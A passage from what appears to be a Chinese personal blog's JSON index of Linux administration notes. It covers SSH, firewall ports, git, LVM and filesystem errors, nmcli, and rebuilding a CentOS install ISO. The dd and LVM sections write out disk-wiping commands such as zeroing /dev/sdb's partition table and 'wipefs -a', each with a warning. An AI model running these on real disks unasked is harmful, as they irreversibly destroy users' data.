因为根目录已经变了，所以修改&#x2F;etc&#x2F;fstab，然后挂载boot分区到&#x2F;boot目录下，通过执行 grub2-mkconfig -o &#x2F;boot&#x2F;grub2&#x2F;grub.cfg 生成新的grub配置文件 如果不放心的话可以查看&#x2F;boot&#x2F;grub2&#x2F;grub.cfg的root&#x3D;UUID&#x3D;，看看对应的uuid是否变为新根的uuid 如果ok了，放心大胆的重启，就算失败了还有 live cd 呢","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"秘术：切根","slug":"秘术：切根","permalink":"http://example.com/tags/%E7%A7%98%E6%9C%AF%EF%BC%9A%E5%88%87%E6%A0%B9/"}]},{"title":"ssh","slug":"ssh","date":"2021-09-12T16:00:00.000Z","updated":"2021-09-16T04:51:26.000Z","comments":true,"path":"2021/09/13/ssh/","permalink":"http://example.com/2021/09/13/ssh/","excerpt":"","text":"配置文件：&#x2F;etc&#x2F;ssh&#x2F;sshd_config 目录：&#x2F;root&#x2F;.sshd 命令ssh命令_参考链接 生成ssh key用户是X在执行 ssh-keygen 时会在~&#x2F;.ssh这个目录里面产生所需要的两把Keys 分别是私钥(id_rsa) 与公钥(id_rsa.pub) 密钥有两种类型rsa和dsa两种，-t用来指定密钥类型，-t rsa是将密钥类型指定为rsa，-C是公钥中的备注，通常指定为自己的邮箱。 123ssh-keygen -t rsa -C &quot;yourname@email.com&quot;然后设置你的密码（邮箱可以不写） ssh自带的sftp功能 Window和Linux的传输工具 123wincp filezip sftp --&gt;基于ssh的安全加密传输 samba sftp客户端连接 123sftp -oPort=22 root@192.168.25.137 put /etc/hosts /tmp get /etc/hosts /home/omd sftp小结： 12341.linux下使用命令： sftp -oPort=22 root@x.x.x.x 2.put加客户端本地路径上传 3.get下载服务器端内容到本地 4.远程连接默认连接用户的家目录 文件known_hosts文件这个文件主要是用来记录服务器端的Host，IP以及rsa文件的 常见报错： 访问服务器时，报Host key verification failed，主机密钥验证失败。 主机就是自己的电脑了，密钥失败主要有两种情况： 一、RSA密钥改了； 二、known_hosts文件中存在缓存记录，如果不是RSA的问题，那应该就是known_hosts文件的问题了 如果是第二种的话，把缓存删了就行 第二种的解决办法 id_rsa主机的私钥 id_rsa.pub主机的公钥 authorized_keys把自己主机的公钥放进目标主机的authorized_keys里面，就可以实现免密登录","categories":[{"name":"linux网络","slug":"linux网络","permalink":"http://example.com/categories/linux%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"技巧","slug":"技巧","permalink":"http://example.com/tags/%E6%8A%80%E5%B7%A7/"},{"name":"远程工具","slug":"远程工具","permalink":"http://example.com/tags/%E8%BF%9C%E7%A8%8B%E5%B7%A5%E5%85%B7/"}]},{"title":"linux防火墙","slug":"linux防火墙","date":"2021-09-09T16:00:00.000Z","updated":"2021-12-15T08:37:00.000Z","comments":true,"path":"2021/09/10/linux防火墙/","permalink":"http://example.com/2021/09/10/linux%E9%98%B2%E7%81%AB%E5%A2%99/","excerpt":"","text":"简介说防火墙就不得不提数据包 数据包经过路由，然后换个ip转发出去。 也就是用不同的源地址重写数据包并将其从不同的网络接口发送出去 Netfilter是位于网卡和内核协议栈之间的一堵墙，是一种免费的软件防火墙，即linux的包的过滤功能，由netfilter 和 iptables 两个组件组成。 Netfilter: Linux内核中的一个数据包处理模块，它可以提供数据包的过滤、转发、地址转换NAT功能。 Iptables: 是一个工具，可以用来在Netfilter中增加、修改、删除数据包处理规则。 端口Ubuntu 18.04开放指定端口12345678910sudo apt-get install iptablessudo iptables -I INPUT -p tcp --dport [端口号] -j ACCEPTsudo iptables -I INPUT -p tcp --dport 9111:9115 -j ACCEPTsudo iptables -I INPUT -p tcp --dport 9111 -j ACCEPT# 临时保存配置，重启后失效sudo iptables-save 安装 iptables-persistent工具，持久化开放端口配置 12345sudo apt-get install iptables-persistentsudo netfilter-persistent savesudo netfilter-persistent reload 另一种方法（Debian&#x2F;Ubuntu） 12sudo ufw allow 22/tcpsudo ufw reload centos（RHEL&#x2F;CentOS&#x2F;Fedora）开放指定端口12345678910firewall-cmd --zone=public --add-port=9011-9221/udp --permanentfirewall-cmd --zone=public --add-port=9011-9221/tcp --permanentfirewall-cmd --permanent --add-port=66666重新载入配置firewall-cmd --reload显示开放的端口firewall-cmd --list-ports 参考链接Ubuntu 与 Centos 开放指定端口","categories":[{"name":"linux网络","slug":"linux网络","permalink":"http://example.com/categories/linux%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"技巧","slug":"技巧","permalink":"http://example.com/tags/%E6%8A%80%E5%B7%A7/"}]},{"title":"dd命令","slug":"dd命令","date":"2021-09-08T16:00:00.000Z","updated":"2021-09-09T05:59:46.000Z","comments":true,"path":"2021/09/09/dd命令/","permalink":"http://example.com/2021/09/09/dd%E5%91%BD%E4%BB%A4/","excerpt":"","text":"作死命令，慎用！！！ 参数详解123456789101112131415if= in file 输入文件，linux下文件的概念应用范围相当广，通常是普通光盘镜像文件或者块设备of= out file 输出文件，通常是普通光盘镜像文件或者块设备bs= buffer size 缓存区大小，你可以认为dd命令读取一块输入文件到buffer(缓存区)，然后将缓存区的内容吸入到输出文件。通常可将bs=1M或者bs=1KB之类的。count= 读取输入文件的最多次数。默认情况下，dd命令直接把输入文件已知读取到文件末尾，这个参数可以控制读取的大小。skip= 跳过文件开头的大小。默认错排能个文件开头开始读取。例子： 将U盘当前状态保存下来成为一个文件。 dd if=/dev/sdb of=/backup/ISO/Upan/save.iso 清空U盘的分区信息（慎重使用） dd if=/dev/zero of=/dev/sdb bs=512K count=1 快速生成大文件123456789101112131415dd if=/dev/zero of=file bs=1M count=20000会生成一个20G的file 文件，文件内容为全0（因从/dev/zero中读取，/dev/zero为0源）此命令可以生成一个实际的20G的文件，文件会写入硬盘，文件产生的速度和硬盘读写速度有关系，读写速度越快，产生文件越快。dd if=/dev/zero of=file bs=1M count=0 seek=20000产生一个大文件的数据，但是并不需要占用磁盘空间此时创建的文件在文件系统中的显示大小为20G，但是并不实际占用磁盘，因此创建速度与内存速度相当。seek的作用是跳过输出文件中指定大小的部分，这就达到了创建大文件，但是并不实际写入的目的。当然，因为不实际写入硬盘，所以你在容量只有20G的硬盘上创建100G的此类文件都是可以的 参考链接1 参考链接2","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"dd","slug":"dd","permalink":"http://example.com/tags/dd/"}]},{"title":"文件系统错误","slug":"文件系统错误","date":"2021-09-08T16:00:00.000Z","updated":"2022-03-15T01:54:40.000Z","comments":true,"path":"2021/09/09/文件系统错误/","permalink":"http://example.com/2021/09/09/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E9%94%99%E8%AF%AF/","excerpt":"","text":"EXT4-fs (sda2): I&#x2F;0 error while writing superblock用livecd挂载磁盘 12sudo umount /dev/sda2sudo fsck -f /dev/sda2 使用fsck修复文件系统错误 pvcreate error : Can’t open &#x2F;dev&#x2F;sdb1 exclusively. Mounted filesystem?lvm分区，创建物理卷报错 1.这个分区可能被使用了 12345ll /dev/mapper/看看分区被谁占了使用dmsetup remove xxx，清除即可 2.它的实际原因是分区中已经存在分区表，导致pvcreate扫描出来已经存在分区表放弃新建了 1234使用dd if=/dev/zero of=/dev/sdb bs=512K count=1清除分区即可（慎用！！！） Can’t remove volume group(LVM)LVM: Device for PV zWRz3Q-rVbA-vM9f-n6q2-s2Oy-24i2-zKt6cO not found or rejected by a filter (PV找不到了) 直接删除PV所属的VG 123456vgreduce --removemissing --force VG 或者vgremove --force VG 如果元数据区域为零则无法使用 解决方法：从文件制作块设备并包含在 VG 中 123456789101112dd if=/dev/zero of=/tmp/tmp.raw bs=1M count=100losetup -flosetup /dev/loop0 /tmp/tmp.rawvgextend $VG /dev/loop0After that I have Metadata Areas 1vgremove --force $VGand remove pvdevicepvremove /dev/loop0 删除丢失的PV vgreduce –removemissing $VG Device &#x2F;dev&#x2F;sdd excluded by a filter.(LVM)12bash-4.2# pvremove -f /dev/sdd Device /dev/sdd excluded by a filter. 意思是，在磁盘上找到旧分区表信息，可以使用“wipefs”清除旧分区信息。 12345bash-4.2# wipefs -a /dev/sdd/dev/sdd：8 个字节已擦除，位置偏移为 0x00000218 (LVM2_member)：4c 56 4d 32 20 30 30 31/dev/sdd：8 个字节已擦除，位置偏移为 0xee77a55e00 (gpt)：45 46 49 20 50 41 52 54/dev/sdd：2 个字节已擦除，位置偏移为 0x000001fe (PMBR)：55 aa/dev/sdd: calling ioclt to re-read partition table: 成功 然后再执行别的操作 Multiple VGs found with the same name: skipping bydata报错信息 123456789[root@localhost /]# vgscan Reading volume groups from cache. Found volume group &quot;bydata&quot; using metadata type lvm2 Found volume group &quot;bydata&quot; using metadata type lvm2[root@localhost /]# vgremove --force bydata Multiple VGs found with the same name: skipping bydata Use --select vg_uuid=&lt;uuid&gt; in place of the VG name. 两个VG名字一样，vgremove $VG不知道要删哪一个 解决方法 使用uuid指定删除 123456[root@localhost /]# pvs -o+vg_uuid PV VG Fmt Attr PSize PFree VG UUID /dev/nvme1n1 bydata lvm2 a-- 894.25g 872.25g qt4Vxd-3r6f-2KBf-x59W-jdsM-TkpC-9wdOL1 /dev/nvme7n1 bydata lvm2 a-- 894.25g 874.25g ec57To-Hw13-f32y-jxX1-kl3f-WJbU-jT4GFq[root@localhost /]# vgremove -S vg_uuid=qt4Vxd-3r6f-2KBf-x59W-jdsM-TkpC-9wdOL1 也可以这么写 1vgs -o+vg_uuid -S vg_name=$VG","categories":[{"name":"Linux磁盘","slug":"Linux磁盘","permalink":"http://example.com/categories/Linux%E7%A3%81%E7%9B%98/"}],"tags":[{"name":"磁盘报错","slug":"磁盘报错","permalink":"http://example.com/tags/%E7%A3%81%E7%9B%98%E6%8A%A5%E9%94%99/"}]},{"title":"git常用命令","slug":"git命令","date":"2021-09-01T16:00:00.000Z","updated":"2021-09-02T10:31:12.000Z","comments":true,"path":"2021/09/02/git命令/","permalink":"http://example.com/2021/09/02/git%E5%91%BD%E4%BB%A4/","excerpt":"","text":"git查看远程仓库地址命令1git remote -v git修改远程仓库地址12345671、 直接修改git remote set-url origin [url]2、 先删后加git remote rm origingit remote add origin [url] 删除commit12345678910111213141516171.被提交到仓库的某个文件需要删除git rm &lt;file&gt; 从工作区和暂存区删除某个文件git commit -m &quot;&quot; 再次提交到仓库2.如果只想从暂存区删除文件，本地工作区不做出改变git rm --cached &lt;file&gt;3.如果在工作区不小心删错了某个文件，可以用 git checkout 将暂存区的文件覆盖工作区的文件，从而把误删的文件恢复：git checkout -- &lt;file&gt;","categories":[{"name":"github仓库","slug":"github仓库","permalink":"http://example.com/categories/github%E4%BB%93%E5%BA%93/"}],"tags":[{"name":"git","slug":"git","permalink":"http://example.com/tags/git/"}]},{"title":"git进行项目管理和版本控制","slug":"git使用","date":"2021-08-31T16:00:00.000Z","updated":"2021-09-02T09:51:26.000Z","comments":true,"path":"2021/09/01/git使用/","permalink":"http://example.com/2021/09/01/git%E4%BD%BF%E7%94%A8/","excerpt":"","text":"整理一下git的使用吧，时间长了老是忘，然后重新找，然后接着忘，记录一下吧 如何将本地文件上传到git仓库？当然是先建一个本地仓库喽 windows下安装一个git bash即可，下载链接：https://git-scm.com/downloads 流程1.创建一个文件夹test然后进入，输入git init就可以把这个目录变成git的本地仓库了123$ git initInitialized empty Git repository in C:/Users/Administrator/Desktop/test/.git/ 一个文件夹可以被初始化成一个本地仓库 我们来查看一下当前文件夹的状态 12345678910$ git statusOn branch masterNo commits yetUntracked files: (use &quot;git add &lt;file&gt;...&quot; to include in what will be committed) std_lvm_v1.2.shnothing added to commit but untracked files present (use &quot;git add&quot; to track) 这里可以看出，此文件夹已被初始化为仓库,分支的默认名为master 为了方便观察，我们将分支修改为test1 1234$ git branch -m master test1$ git statusOn branch test1 下面看一下没执行过git init的文件夹 12$ git statusfatal: not a git repository (or any of the parent directories): .git 2. 配置用户信息，这样提交代码时，git就知道是谁提交的123456查看全部的用户信息cat ~/.gitconfig添加用户信息git config --global user.name yournamegit config --global user.email youremail 3.把文件夹里的文件添加到缓存区123git rm -r --cached .清理git缓存git add . 4.将文件提交到本地仓库1git commit -m &#x27;备注&#x27; 5.关联远程仓库1git remote add origin 你的远程仓库地址 6.同步仓库（push这个分支）1git push -u origin test1 这个push可以是SSH或HTTPS 如果是SSH把本地ssh私钥加进github上 1.生成ssh key用户是X在执行 ssh-keygen 时会在~&#x2F;.ssh这个目录里面产生所需要的两把Keys 分别是私钥(id_rsa) 与公钥(id_rsa.pub) 1234ssh-keygen -t rsa -C &quot;youremail@email.com&quot;引号中是你在github上的注册邮箱之后设定你的ssh密码 2.执行以下命令1234567891011eval &quot;ssh-agent -s&quot;ssh-agent bashssh-add ~/.ssh/id_rsa提示Identity added :说明已添加成功查看公钥cat ~/.ssh/id_rsa.pub然后在github中添加即可 如果是HTTPS1还没测试 参考链接： https://www.huaweicloud.com/articles/a309afc2a9bcf498763ab43770993587.html git官方文档 https://git-scm.com/book/zh/v2/ 生成ssh key https://blog.csdn.net/Suo_ivy/article/details/79940839 有关commit的解释 https://segmentfault.com/a/1190000005638174 有关branch（分支）的解释 https://backlog.com/git-tutorial/cn/stepup/stepup1_1.html git常用命令 https://cloud.tencent.com/developer/article/1148355","categories":[{"name":"github仓库","slug":"github仓库","permalink":"http://example.com/categories/github%E4%BB%93%E5%BA%93/"}],"tags":[{"name":"git","slug":"git","permalink":"http://example.com/tags/git/"},{"name":"版本控制","slug":"版本控制","permalink":"http://example.com/tags/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/"},{"name":"项目管理","slug":"项目管理","permalink":"http://example.com/tags/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/"}]},{"title":"git修改分支名","slug":"git修改分支名","date":"2021-08-31T16:00:00.000Z","updated":"2021-09-01T09:48:08.000Z","comments":true,"path":"2021/09/01/git修改分支名/","permalink":"http://example.com/2021/09/01/git%E4%BF%AE%E6%94%B9%E5%88%86%E6%94%AF%E5%90%8D/","excerpt":"","text":"本地分支重命名(还没有推送到远程)1git branch -m oldName newName 远程分支重命名 (已经推送远程-假设本地分支和远程对应分支名称相同)重命名远程分支对应的本地分支 1git branch -m oldName newName 删除远程分支 1git push --delete origin oldName 上传新命名的本地分支 1git push origin newName 把修改后的本地分支与远程分支关联 1git branch --set-upstream-to origin/newName 参考连接 https://www.jianshu.com/p/cc740394faf5","categories":[{"name":"github仓库","slug":"github仓库","permalink":"http://example.com/categories/github%E4%BB%93%E5%BA%93/"}],"tags":[{"name":"branch","slug":"branch","permalink":"http://example.com/tags/branch/"}]},{"title":"wget命令","slug":"wget命令","date":"2021-08-31T16:00:00.000Z","updated":"2021-09-01T08:09:24.000Z","comments":true,"path":"2021/09/01/wget命令/","permalink":"http://example.com/2021/09/01/wget%E5%91%BD%E4%BB%A4/","excerpt":"","text":"如何在Windows下的git bash中添加wget 下载wget二进制安装包，地址：https://eternallybored.org/misc/wget/ 2、解压安装包，将wget.exe 拷贝到C:\\Program Files\\Git\\mingw64\\bin\\ 下面 用法参考连接https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/wget.html","categories":[{"name":"文本","slug":"文本","permalink":"http://example.com/categories/%E6%96%87%E6%9C%AC/"}],"tags":[{"name":"wget","slug":"wget","permalink":"http://example.com/tags/wget/"}]},{"title":"shell 中给命令设置超时时间","slug":"shell中给命令设置超时时间","date":"2021-08-30T16:00:00.000Z","updated":"2021-08-31T08:38:50.000Z","comments":true,"path":"2021/08/31/shell中给命令设置超时时间/","permalink":"http://example.com/2021/08/31/shell%E4%B8%AD%E7%BB%99%E5%91%BD%E4%BB%A4%E8%AE%BE%E7%BD%AE%E8%B6%85%E6%97%B6%E6%97%B6%E9%97%B4/","excerpt":"","text":"在我们写 shell 脚本的时候，有时候想给一个命令设置一个超时时间，当命令执行了多长时间还没有执行完就强制终止;我们可以采用如下方式 1timeout 3 sleep 30 当 sleep 执行 3 秒的时候就会终止。 timeout [选项] 数字[后缀] 命令 [参数]… 后缀”s”代表秒(默认值，”m”代表分，”h”代表小时，”d”代表天。 参考链接： https://blog.51cto.com/u_13447608/2561992","categories":[{"name":"shell","slug":"shell","permalink":"http://example.com/categories/shell/"}],"tags":[{"name":"timeout","slug":"timeout","permalink":"http://example.com/tags/timeout/"}]},{"title":"linux_iso镜像解析","slug":"linux_iso镜像解析","date":"2021-08-22T16:00:00.000Z","updated":"2022-03-18T09:21:42.000Z","comments":true,"path":"2021/08/23/linux_iso镜像解析/","permalink":"http://example.com/2021/08/23/linux_iso%E9%95%9C%E5%83%8F%E8%A7%A3%E6%9E%90/","excerpt":"","text":"最近要搞一下linux系统，每段时间总结记录一下吧 CentOS ISO 目录树如下： 1234567891011121314[root@localhost jusha_test]# tree -L 1.├── CentOS_BuildTag├── EFI├── EULA├── GPL├── images├── isolinux├── LiveOS├── Packages├── repodata├── RPM-GPG-KEY-CentOS-7└── RPM-GPG-KEY-CentOS-Testing-7 ISO 9660ISO 9660 是一种文件系统，也是一种规范，它规定了 ISO 文件应该是什么样子，常见的 Linux 发行版 ISO 都符合该规范。 引导有了 ISO，有了计算机，那么我们需要使用 ISO 安装想要的操作系统，通常我们会将 ISO 通过光盘&#x2F;USB&#x2F;网络等方式挂载到计算机上，通过设置 BIOS&#x2F;UEFI 选项，将启动项设置为 ISO，然后启动进行安装。接下来一个一个来说。 BIOS&#x2F;UEFI 通常存放在闪存中，在计算机开机自检完成后，加载引导程序（bootloader），这个初始化过程称为引导。BIOS&#x2F;UEFI 通常允许用户设置加载选项，即从系统的众多设备中按照顺序进行加载，常见的比如：硬盘、光盘、网络、USB 等。当第一个设备加载失败后，会尝试第二个设备，以此类推，如果最终所有设备都无法加载，那么系统处于开机但未引导状态。 光盘引导引导分为很多种，例如硬盘引导，光盘引导（iso），下面我们主要讲一下光盘引导 根据 El-Torito 规范，BIOS 会读取 ISO 的准确地址进行判断，ISO 是否可以进行引导启动（在第 71 字节地址保存引导目录）。如果判断可引导，那么就加载对应的引导程序（bootloader）。 常见的引导程序有：SYSLINUX,ISOLINUX（光盘安装）,PXELINUX（网络安装）,EXTLINUX 等，这些可以统称为 Syslinux，目前最常见的应该是 ISOLINUX。PXELINUX 用于从网络引导，EXTLINUX 用于 ext 系列文件系统引导。 注意：由于目前 UEFI 的普遍性，部分 LiveCD ISO 会同时带有 ISOLINUX 和 GRUB 两种引导程序。 isolinux 目录树如下： 123456789101112131415[root@localhost isolinux]# tree -L 1.├── boot.cat # 启动目录├── boot.msg # 启动信息├── grub.conf # GRUB 配置文件├── initrd.img # 临时文件系统├── isolinux.bin # ISOLINUX 引导程序├── isolinux.cfg # ISOLINUX 引导配置文件├── ks.cfg # kickstart配置文件├── memtest # 内存测试可执行文件├── vesamenu.c32 # 内存测试可执行文件├── splash.png # ISOLINUX 引导背景图片└── vmlinuz # 内核映像 光盘引导的大致流程是 加载 isolinux.bin 加载 isolinux.cfg,vesamenu.c32,splash.png 生成启动菜单 根据选项决定是否加载 vmlinuz, initrd.img EFI123456789101112131415$ tree .├── BOOT│ ├── BOOTIA32.EFI # 32位系统 EFI 启动程序│ ├── BOOTX64.EFI # 64位系统 EFI 启动程序│ ├── fonts # 字体│ │ ├── TRANS.TBL│ │ └── unicode.pf2│ ├── grub.cfg # GRUB 配置│ ├── grubia32.efi # GRUB 32位引导程序│ ├── grubx64.efi # GRUB 64位引导程序│ ├── mmia32.efi # 内存测试 32 位执行程序│ ├── mmx64.efi # 内存测试 64 位执行程序│ └── TRANS.TBL└── TRANS.TBL 如果机器的启动方式为BIOS，则启动方式为isolinux如果机器的启动方式为UEFI，则启动方式为grub(EFI) images123456[root@localhost images]# tree -L 2.├── efiboot.img└── pxeboot ├── initrd.img └── vmlinuz 这个文件夹就是把 vmlinuz 和 initrd.img 提取出来了，在 EFI 路径下的 BOOT&#x2F;grub.cfg 中有很多选项都是使用的 pxeboot&#x2F;vmlinuz 。当然它最大的作用也是跟路径名一样，images，当你要配置一个发行版作为网络安装时，需要对应的 vmlinuz 和 initrd.img，那么可以从这个路径下获取，不会造成我要通过 PXELINUX 引导，却需要去 EFI 路径下获取文件的困扰。 LiveOS123[root@localhost LiveOS]# tree -L 2.└── squashfs.img 可以理解为完整版的initrd.img，也就是完整版的文件系统 linux启动顺序 开机 BIOS 检测（硬件检测、引导顺序等） 读取并运行装置内 MBR 的 boot Loader 加载内核 启动 liveCD 或 Anaconda 由用户配置安装选项或解析 kickstart 配置 分区并挂载文件系统 完成安装，重启 让我们看一下isolinux.cfg配置文件 12345678[root@localhost jusha_test]# cat isolinux/isolinux.cfg default linux #默认的label是linuxdisplay boot.msg #开机显示的信息（可编辑）label linux kernel vmlinuz #加载内核 append initrd=initrd.img inst.stage2=hd:LABEL=CENTOS7_STD inst.ks=hd:LABEL=CENTOS7_STD:/isolinux/ks.cfg net.ifnames=0 biosdevname=0 quiet inst.noshell 系统内核 vmlinuz被加载到内存后开始提供底层支持，在内核的支持下各种模块，服务等被加载运行。 假设你的硬盘是scsi 接口而你的内核又不支持这种接口时，你的内核就没有办法访问硬盘，当然也没法加载硬盘上的文件系统，怎么办？好办！把内核加入scsi驱动源码然后重新编译出一个新的内核文件替换原来vmlinuz。 需要改变标准内核默认提供支持的例子还有很多，如果每次都需要编译内核就太麻烦了。所以后来的linux就提供了一个灵活的方法来解决这些问题—initrd.img ininrd.img是什么呢？initrd 的含义是initialized ram disk. ramdisk是用一部分内存模拟成磁盘，让操作系统访问。举个例子，PE系统就是在内存中运行的系统，进入系统中你会发现有一个文件系统B：&#x2F;分区，这个就是内存模拟出来的硬盘 initrd.img文件就是个ramdisk的映像文件，也就是PE系统 加载内核————&gt;运行initrd.img（加载PE系统）————&gt;运行某个装机脚本（例如ks.cfg，或者是默认的那个）————&gt; 把 squashfs.img 解包到loop设备，挂载为根目录，chroot到根目录上————&gt; 根据安装脚本，把所需的文件从 根目录 中拷贝到硬盘的分区中（也就是把系统拷贝过去，并不会把 根目录 中所有的文件都拷过去） 如何制作repodata1234567891011repodata/├── 2f0a01d165af065cbd008f1ef26733def65e2cb3fc5586246caea7f57bc026b1-filelists.xml.gz├── 4e0837df911f9763b3f638d73192531321b02dc95cc8e8a32151c5de2055a284-std.xml.gz├── 56c81c83e52761e2075faf327dd441629993248ac1db939aa252eeea69c0b795-other.xml.gz├── 6dbc623e7a6dc19dc382c0b461b1890d008ceb190828466f3e7ff9a0cde3b63c-other.sqlite.bz2├── 723e3f42aa3acb6937c9d4466e2da92a6792091b98e7cb8355c84c422c2c03cc-std.xml├── 733efc4dd0dd3a361fb3c2be99163255a1366a29ab704a88bf337a1ddbf3771b-primary.xml.gz├── a571bb0313b8632e69d483d0cc139a08ca3eb1ba0e80016023447b85d45654a6-filelists.sqlite.bz2├── ebd90cbe99f59185bd0b5b7af499e799db86f4aaf86eb4bd49868027f5b43670-primary.sqlite.bz2└── repomd.xml repodata就是 软件库索引，对应的就是Packages里的rpm包其中的 *-std.xml就是索引文件如果要在系统里预设一些软件，可以把相应的rpm包和依赖打入Packages里，然后把repodata里的索引文件复制、编辑，最后使用 createrepo重新生成即可 123456789cp /centos_std/repodata/*-std.xml /centos_std/std.xml编辑std.xml，把要加的软件加进去把要打的rpm包加到Packages里rm -rf /centos_std/repodatacreaterepo -g /centos_std/std.xml /centos_std/ 如何下载软件所需的rpm包和依赖推荐使用repotrack（该软件在yum-utils包里） 123456789101112yum -y install yum-utilsrepotrack &lt;package-name&gt; -p &lt;下载路径&gt;&lt;package-name&gt;可以使用 yum install &lt;软件名&gt;查找例1：yum install vim，找到包为vim-enhanced-7.4.629-8.el7_9.x86_64repotrack vim-enhanced -p /centos_std/Packages这就会下载vim-enhanced包和这个包的依赖要打的包和依赖都下载完后，要更新软件库索引 也可以使用yum来安装（不过依赖可能会有问题） 123456显示依赖yum deplist vimyum install --downloadonly --downloaddir=Packages &lt;package-name&gt;如果是已安装的软件，则用reinstall 如何解压initrd.img查看文件类型 1234567891011[root@localhost jusha_test]# file isolinux/initrd.img isolinux/initrd.img: XZ compressed data发现是xz的压缩类型mv initrd.img initrd.img.xzxz -d initrd.img.xz解压出来是cpio archive文件，然后文件解压出来：cpio -i -d &lt; initrd.img打包成cpio archive文件并压缩为gzip格式find . | cpio -H newc --create --verbose | gzip -9 &gt; ../initrd.img 如何搞squashfs.img看一下文件类型 12[root@localhost jusha_test]# file LiveOS/squashfs.img LiveOS/squashfs.img: Squashfs filesystem, little endian, version 4.0, 640503068 bytes, 3 inodes, blocksize: 1048576 bytes, created: Mon Aug 23 03:28:08 2021 这个就是一个Squashfs的文件系统 我们来解压一下看看 123456789unsquashfs squashfs.img会得到一个squashfs-root的文件夹[root@localhost squashfs-root]# tree -L 2.└── LiveOS └── rootfs.img1 directory, 1 file 看一下rootfs.img的文件类型 12[root@localhost LiveOS]# file rootfs.img rootfs.img: Linux rev 1.0 ext4 filesystem data, UUID=b44bfac8-86bb-4036-a6f4-bdcf6988f4ad, volume name &quot;Anaconda&quot; (extents) (64bit) (huge files) 发现这是一个ext4的文件系统，如果要修改这个文件的话，直接挂载然后修改就行 12345mount -o loop root.img std然后cd进去修改就可以了，改好了之后umount std最后打包成squashfs.imgmksquashfs squashfs-root squashfs.img -b 1024k -comp xz 系统打包如果有TRANS.TBL文件，提前删掉，打包时会自动生成的 123rm -rf `find ./ -name TRANS.TBL`mkisofs -o ../STD.iso -b isolinux/isolinux.bin -c isolinux/boot.cat --no-emul-boot --boot-load-size 4 --boot-info-table -J -R -T -V &quot;CENTOS7_STD&quot; . 参考链接：roofs.img的制作 https://www.codenong.com/cs106751361/ https://blog.csdn.net/prownd/article/details/53422977 linux引导https://zdyxry.github.io/2019/12/01/Linux-%E5%BC%95%E5%AF%BC%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/ http://blog.zxh.site/2018/02/16/Linux%E5%AE%9A%E5%88%B6%E5%8C%96%E9%95%9C%E5%83%8F%E5%88%B6%E4%BD%9C%E6%8C%87%E5%8D%97/","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"iso","slug":"iso","permalink":"http://example.com/tags/iso/"}]},{"title":"docker容器在部署服务后一直重启","slug":"docker容器一直重启","date":"2021-08-19T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/08/20/docker容器一直重启/","permalink":"http://example.com/2021/08/20/docker%E5%AE%B9%E5%99%A8%E4%B8%80%E7%9B%B4%E9%87%8D%E5%90%AF/","excerpt":"","text":"问题：服务部署上去一直重启 查看容器日志，发现有个文件缺失，导致服务一直重启 创建缺失的文件后，发现问题仍然没有解决，怀疑是服务版本不兼容导致 更换版本，问题解决","categories":[{"name":"服务器容器","slug":"服务器容器","permalink":"http://example.com/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://example.com/tags/docker/"}]},{"title":"nmcli 命令","slug":"nmcli","date":"2021-08-18T16:00:00.000Z","updated":"2022-10-18T07:07:54.000Z","comments":true,"path":"2021/08/19/nmcli/","permalink":"http://example.com/2021/08/19/nmcli/","excerpt":"","text":"用户和脚本都可使用命令行工具 nmcli 控制 NetworkManager。 该命令的基本格式为：1nmcli OPTIONS OBJECT &#123; COMMAND | help &#125; 其中 OBJECT 可为 general、networking、radio、connection 或 device 之一。最常用的选项为：-t, –terse（用于脚本）、-p, –pretty 选项（用于用户） 命令实例1234567891011121314显示 NetworkManager 总体状态：nmcli general status显示所有链接：nmcli connection show只显示当前活动链接nmcli connection show --active显示由 NetworkManager 识别到设备及其状态：nmcli device status激活eth1nmcli con up eth1 使用 nmcli 启动和停止接口1234nmcli con up id bond0nmcli con up id port0nmcli dev disconnect iface bond0nmcli dev disconnect iface ens3 注意：建议使用 nmcli dev disconnect iface iface-name 命令，而不是 nmcli con down id id-string 命令，因为连接断开可将该接口放到“手动”模式，这样做用户让 NetworkManager 启动某个连接前，或发生外部事件（比如载波变化、休眠或睡眠）前，不会启动任何自动连接。 查看网卡MAC地址123nmcli dev show |grep $网卡 -A 20ip -br link show $网卡 查看网卡UUID1nmcli con show 了解 nmcli 选项type — 连接类型。 12允许值为：adsl, bond, bond-slave, bridge, bridge-slave, bluetooth, cdma, ethernet, gsm, infiniband, olpc-mesh, team, team-slave, vlan, wifi, wimax. 查看网卡型号1lspci | grep -i ethernet 添加配置文件1nmcli connection add type ethernet ifname em1 con-name em1 autoconnect yes 删除网卡接口网卡的接口就是NAME 1nmcli con del &#x27;有线连接 1&#x27; 错误：无法创建 NMClient 对象GDBus.Error:org.freedesktop.DBus.Error.UnknownMethod: 1systemctl restart NetworkManager centos7配置网络nmcli无法使用 参考文件： 使用 NETWORKMANAGER 命令行工具 NMCLI 官方文档 centOS7网络管理命令nmcli 网卡中 HWADDR，NAME，DEVICE，UUID 的关系任意修改CentOS下网卡的显示名称和设备名称","categories":[{"name":"linux网络","slug":"linux网络","permalink":"http://example.com/categories/linux%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"nmcli","slug":"nmcli","permalink":"http://example.com/tags/nmcli/"}]},{"title":"CMOS放电","slug":"CMOS放电","date":"2021-08-07T16:00:00.000Z","updated":"2021-10-29T09:06:24.000Z","comments":true,"path":"2021/08/08/CMOS放电/","permalink":"http://example.com/2021/08/08/CMOS%E6%94%BE%E7%94%B5/","excerpt":"","text":"http://www.kiaic.com/article/detail/1790.html","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"CMOS","slug":"CMOS","permalink":"http://example.com/tags/CMOS/"}]},{"title":"curl用法","slug":"curl","date":"2021-08-07T16:00:00.000Z","updated":"2023-01-29T